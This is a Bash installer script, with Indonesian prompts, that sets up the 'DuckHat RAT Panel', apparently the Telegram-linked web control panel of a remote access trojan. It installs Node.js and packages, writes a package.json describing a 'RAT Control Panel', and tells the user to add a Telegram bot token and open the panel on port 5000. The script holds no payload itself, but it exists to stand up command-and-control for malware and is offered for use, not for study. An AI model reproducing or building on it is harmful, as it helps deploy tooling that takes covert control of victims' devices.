#!/bin/bash

# ======== COLOR ============== 
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m' # No Color

#============== ANIMATION ==============
animate_text() {
    local text="$1"
    local color="$2"
    echo -n -e "${color}"
    for (( i=0; i<${#text}; i++ )); do
        echo -n "${text:$i:1}"
        sleep 0.05
    done
    echo -e "${NC}"
}

#============== FUNCTION EMOJI ==============
print_colored() {
    echo -e "${1}${2}${NC}"
}

#============== BORDER PRINT ==============
print_box() {
    local text="$1"
    local color="$2"
    local length=${#text}
    local border_char="="

    echo -e "${color}"
    printf "%*s\n" $((length + 4)) | tr ' ' "$border_char"
    echo "  $text  "
    printf "%*s\n" $((length + 4)) | tr ' ' "$border_char"
    echo -e "${NC}"
}

#============== CEK TO COMMAND ==============
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

#============== DETECT OS ==============
detect_os() {
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        echo "linux"
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        echo "macos"
    elif [[ "$OSTYPE" == "msys" ]] || [[ "$OSTYPE" == "cygwin" ]]; then
        echo "windows"
    else
        echo "unknown"
    fi
}

#============== INFO INTERNET AND SYSTEM ==============
check_internet_and_info() {
    local os=$(detect_os)
    local node_version=""
    local npm_version=""
    local internet_status=""

    # ============== CEK INTERNET ==============
    if ping -c 1 google.com &> /dev/null; then
        internet_status="${GREEN}●${NC} Online"
    else
        internet_status="${RED}●${NC} Offline"
    fi

    # ============== GET VERSION ==============
    if command_exists node; then
        node_version=$(node --version)
    else
        node_version="${RED}Not installed${NC}"
    fi

    if command_exists npm; then
        npm_version=$(npm --version)
    else
        npm_version="${RED}Not installed${NC}"
    fi

    # ============== SYSTEM INFO ==============
    echo -e "${BOLD}${BLUE}┌─ System Information ──────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│${NC} 🌐 Internet: $internet_status    🖥️  OS: ${CYAN}$os${NC}    🟢 Node: ${CYAN}$node_version${NC}    📦 NPM: ${CYAN}$npm_version${NC} ${BLUE}│${NC}"
    echo -e "${BOLD}${BLUE}└───────────────────────────────────────────────────────────────────────────────┘${NC}"
    echo ""

    # ============== wARNING IF OFFILNE ==============
    if ! ping -c 1 google.com &> /dev/null; then
        print_colored $YELLOW "⚠️  Offline mode: Some features may not work properly"
        echo ""
    fi
}

#============== DISPLAY BANNER ==============
display_banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
    ╔═══════════════════════════════════════════════════════════════════════╗
    ║                                                                       ║
    ║    ██████╗ ██╗   ██╗ ██████╗██╗  ██╗██╗  ██╗ █████╗ ████████╗         ║
    ║    ██╔══██╗██║   ██║██╔════╝██║ ██╔╝██║  ██║██╔══██╗╚══██╔══╝         ║
    ║    ██║  ██║██║   ██║██║     █████╔╝ ███████║███████║   ██║            ║
    ║    ██║  ██║██║   ██║██║     ██╔═██╗ ██╔══██║██╔══██║   ██║            ║
    ║    ██████╔╝╚██████╔╝╚██████╗██║  ██╗██║  ██║██║  ██║   ██║            ║
    ║    ╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝            ║
    ║                                                                       ║
    ║                    🚀 INSTALLER OTOMATIS v2.0                         ║
    ║                   Dibuat oleh @izal_buyx - DuskCipher                 ║
    ║                                                                       ║
    ╚═══════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"

    animate_text "🔥 Selamat datang di installer DuckHat RAT Panel!" "$BOLD$GREEN"
    echo ""
    sleep 1
}

# Function to install Node.js based on OS
install_nodejs() {
    local os=$(detect_os)

    print_box "📥 MENGINSTALL NODE.JS" "$BOLD$YELLOW"

    case $os in
        "linux")
            print_colored $BLUE "🐧 Menginstall Node.js untuk Linux..."
            if command_exists apt-get; then
                sudo apt-get update
                sudo apt-get install -y nodejs npm
            elif command_exists yum; then
                sudo yum install -y nodejs npm
            elif command_exists pacman; then
                sudo pacman -S nodejs npm
            else
                print_colored $RED "❌ Package manager tidak dikenali. Install Node.js secara manual."
                return 1
            fi
            ;;
        "macos")
            print_colored $BLUE "🍎 Menginstall Node.js untuk macOS..."
            if command_exists brew; then
                brew install node
            else
                print_colored $YELLOW "⚠️  Homebrew tidak ditemukan. Menginstall Homebrew terlebih dahulu..."
                /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
                brew install node
            fi
            ;;
        "windows")
            print_colored $BLUE "🪟 Untuk Windows, silakan download Node.js dari:"
            print_colored $CYAN "https://nodejs.org/en/download/"
            print_colored $YELLOW "⚠️  Restart terminal setelah instalasi selesai."
            return 1
            ;;
        *)
            print_colored $RED "❌ OS tidak dikenali. Install Node.js secara manual."
            return 1
            ;;
    esac

    # Verify installation
    if command_exists node && command_exists npm; then
        print_colored $GREEN "✅ Node.js berhasil diinstall!"
        print_colored $CYAN "🟢 Node.js version: $(node --version)"
        print_colored $CYAN "📦 NPM version: $(npm --version)"
        return 0
    else
        print_colored $RED "❌ Gagal menginstall Node.js!"
        return 1
    fi
}

# Function to create project structure
create_project_structure() {
    print_box "📁 MEMBUAT STRUKTUR PROJECT" "$BOLD$PURPLE"

    local directories=("uploadedFile" "logs" "temp" "public")

    for dir in "${directories[@]}"; do
        if [[ ! -d "$dir" ]]; then
            mkdir -p "$dir"
            print_colored $GREEN "✅ Direktori dibuat: $dir"
        else
            print_colored $YELLOW "⚠️  Direktori sudah ada: $dir"
        fi
        sleep 0.2
    done

    # Create .gitignore if it doesn't exist
    if [[ ! -f ".gitignore" ]]; then
        cat > .gitignore << 'EOF'
# Dependencies
node_modules/
npm-debug.log*

# Runtime data
logs/
*.log
pids
*.pid
*.seed
*.pid.lock

# Coverage directory used by tools like istanbul
coverage/

# Uploaded files
uploadedFile/*
!uploadedFile/.gitkeep

# Temporary files
temp/*
!temp/.gitkeep

# Environment variables
.env
.env.local
.env.development.local
.env.test.local
.env.production.local

# OS generated files
.DS_Store
.DS_Store?
._*
.Spotlight-V100
.Trashes
ehthumbs.db
Thumbs.db
EOF
        print_colored $GREEN "✅ File .gitignore dibuat"
    fi

    # Create placeholder files
    touch uploadedFile/.gitkeep
    touch logs/.gitkeep
    touch temp/.gitkeep

    print_colored $GREEN "🎉 Struktur project berhasil dibuat!"
}

# Function to install dependencies
install_dependencies() {
    print_box "📦 MENGINSTALL DEPENDENCIES" "$BOLD$GREEN"

    if [[ ! -f "package.json" ]]; then
        print_colored $RED "❌ File package.json tidak ditemukan!"
        print_colored $YELLOW "🔧 Membuat package.json baru..."

        cat > package.json << 'EOF'
{
  "name": "duckhat-rat-panel",
  "version": "1.0.0",
  "description": "DuckHat RAT Control Panel",
  "main": "index.js",
  "scripts": {
    "start": "node index.js",
    "dev": "nodemon index.js",
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "@izal_buyx - DuskCipher",
  "license": "MIT",
  "dependencies": {
    "express": "^4.18.2",
    "ws": "^8.14.2",
    "node-telegram-bot-api": "^0.64.0",
    "uuid": "^9.0.1",
    "multer": "^1.4.5-lts.1",
    "body-parser": "^1.20.2",
    "axios": "^1.6.0"
  },
  "devDependencies": {
    "nodemon": "^3.0.1"
  }
}
EOF
        print_colored $GREEN "✅ File package.json dibuat!"
    fi

    print_colored $BLUE "📥 Menginstall dependencies..."

    # Show simple progress with spinner
    {
        npm install --silent > /dev/null 2>&1 &
        local npm_pid=$!
        local spinner=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
        local i=0

        echo -n "   "
        while kill -0 $npm_pid 2>/dev/null; do
            printf "\r   ${spinner[$i]} Installing packages..."
            i=$(( (i+1) % ${#spinner[@]} ))
            sleep 0.1
        done

        wait $npm_pid
        local exit_code=$?
        printf "\r   ✅ Installing packages... Done!                    \n"
        return $exit_code
    }

    if [[ $? -eq 0 ]]; then
        print_colored $GREEN "🎉 Dependencies berhasil diinstall!"

        # Show installed packages
        print_colored $CYAN "📋 Packages yang diinstall:"
        npm list --depth=0 2>/dev/null | grep -E "├──|└──" | while read line; do
            print_colored $WHITE "   $line"
        done
    else
        print_colored $RED "❌ Gagal menginstall dependencies!"
        return 1
    fi
}

# Function to verify installation
verify_installation() {
    print_box "🔍 VERIFIKASI INSTALASI" "$BOLD$CYAN"

    local required_files=("index.js" "package.json" "web-control.html")
    local missing_files=()

    for file in "${required_files[@]}"; do
        if [[ -f "$file" ]]; then
            print_colored $GREEN "✅ $file"
        else
            print_colored $RED "❌ $file (tidak ditemukan)"
            missing_files+=("$file")
        fi
    done

    if [[ ${#missing_files[@]} -eq 0 ]]; then
        print_colored $GREEN "🎉 Semua file ditemukan!"
        return 0
    else
        print_colored $RED "❌ File yang hilang: ${missing_files[*]}"
        return 1
    fi
}

# Function to show final instructions
show_final_instructions() {
    print_box "🎯 INSTALASI SELESAI!" "$BOLD$GREEN"

    print_colored $GREEN "🎉 DuckHat RAT Panel berhasil diinstall!"
    echo ""
    print_colored $CYAN "📋 Langkah selanjutnya:"
    print_colored $WHITE "   1. Jalankan: bash start.sh"
    print_colored $WHITE "   2. Masukkan token bot Telegram Anda"
    print_colored $WHITE "   3. Masukkan Chat ID Telegram Anda"
    print_colored $WHITE "   4. Akses web panel di: http://localhost:5000/web-control"
    echo ""
    print_colored $CYAN "🔗 Links berguna:"
    print_colored $WHITE "   • Web Control Panel: http://localhost:5000/web-control"
    print_colored $WHITE "   • File Manager: http://localhost:5000/uploadedFile"
    print_colored $WHITE "   • Homepage: http://localhost:5000"
    echo ""
    print_colored $YELLOW "⚠️  PENTING:"
    print_colored $WHITE "   • Simpan token bot dan chat ID dengan aman"
    print_colored $WHITE "   • Pastikan firewall mengizinkan port 5000"
    print_colored $WHITE "   • Gunakan tools ini dengan bijak dan legal"
    echo ""
    print_colored $PURPLE "💝 Terima kasih telah menggunakan DuckHat RAT Panel!"
    print_colored $PURPLE "🌟 Dibuat dengan ❤️  oleh @izal_buyx - DuskCipher"
}

# Function to handle errors
handle_error() {
    print_colored $RED "❌ Terjadi error selama instalasi!"
    print_colored $YELLOW "🔧 Coba langkah-langkah berikut:"
    print_colored $WHITE "   1. Pastikan koneksi internet stabil"
    print_colored $WHITE "   2. Jalankan script dengan sudo (Linux/macOS)"
    print_colored $WHITE "   3. Install Node.js secara manual jika diperlukan"
    print_colored $WHITE "   4. Periksa log error di atas"
    echo ""
    print_colored $CYAN "🆘 Butuh bantuan? Hubungi @izal_buyx"
    exit 1
}

# Function to cleanup on interrupt
cleanup() {
    echo ""
    print_colored $YELLOW "⚠️  Instalasi dibatalkan oleh user."
    print_colored $YELLOW "🧹 Membersihkan file sementara..."
    exit 0
}

# Set up signal handlers
trap cleanup SIGINT SIGTERM

# Main installation function
main() {
    # Display banner
    display_banner

    # Check internet connectivity and show system info
    check_internet_and_info

    # Check if Node.js is installed
    if ! command_exists node || ! command_exists npm; then
        print_colored $YELLOW "⚠️  Node.js tidak ditemukan. Menginstall..."
        if ! install_nodejs; then
            handle_error
        fi
    else
        print_colored $GREEN "✅ Node.js sudah terinstall!"
    fi

    # Create project structure
    if ! create_project_structure; then
        handle_error
    fi

    # Install dependencies
    if ! install_dependencies; then
        handle_error
    fi

    # Verify installation
    if ! verify_installation; then
        handle_error
    fi

    # Show final instructions
    show_final_instructions

    # Ask if user wants to start immediately
    echo ""
    read -p "🚀 Mulai server sekarang? (y/n): " START_NOW
    if [[ "$START_NOW" =~ ^[Yy]$ ]]; then
        print_colored $GREEN "🚀 Memulai server..."
        sleep 2
        bash start.sh
    else
        print_colored $CYAN "👍 Oke! Jalankan 'bash start.sh' kapan saja untuk memulai server."
    fi
}

# Run main function
main "$@"